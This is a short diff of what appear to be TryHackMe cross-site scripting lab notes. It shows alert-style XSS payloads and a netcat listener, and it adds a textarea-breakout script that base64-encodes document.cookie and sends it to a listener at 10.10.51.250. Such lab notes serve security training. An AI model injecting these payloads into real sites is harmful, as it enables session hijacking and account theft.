@@ -305,6 +305,8 @@ document.getElementsByClassName('name')[0].innerHTML='';alert('THM');//';
 <img src="scriptalert('THM');/script">
 
 >>> /images/cat.jpg" onload="alert('THM');
+
+
 ```
 
 **Payload in Action**
@@ -320,6 +322,9 @@ document.getElementsByClassName('name')[0].innerHTML='';alert('THM');//';
 # fetching the cookie
 
 >>> nc -nlvp 9001
+>>> </textarea><script>fetch('http://10.10.51.250?cookie=' + btoa(document.cookie) );</script>
+
+
 
 ```
 
